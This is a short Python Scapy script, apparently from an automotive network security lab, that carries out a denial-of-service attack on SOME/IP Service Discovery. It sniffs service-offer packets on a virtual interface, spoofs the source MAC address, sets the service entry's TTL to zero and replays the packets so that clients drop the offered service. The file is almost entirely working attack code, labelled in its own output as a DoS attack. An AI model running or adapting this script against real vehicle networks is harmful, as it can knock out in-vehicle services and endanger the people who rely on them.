from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
import time
from datetime import datetime
import struct
import numpy as np
import pdb



def process_packet(packet):
    if packet.haslayer(IP) and packet.haslayer(UDP):
        if packet.haslayer(SD):
            pdb.set_trace()
            print("SOMEIP-SD-Offer DoS Attack Start!")
            packet[IP].ttl = 4
            packet[Ether].src = '00:00:00:00:00:08'
            packet[SD][SDEntry_Service].ttl = 0
            packet = update_udp_chksum(packet)
            sendp(packet, iface='veth0.3', count=3)
            print("SOMEIP-SD-Offer DoS Attack Done!")

filter = "udp and src host 10.0.3.2 and src port 30490 and dst port 30490"
sniff(filter=filter, iface='veth0.3', prn=process_packet)
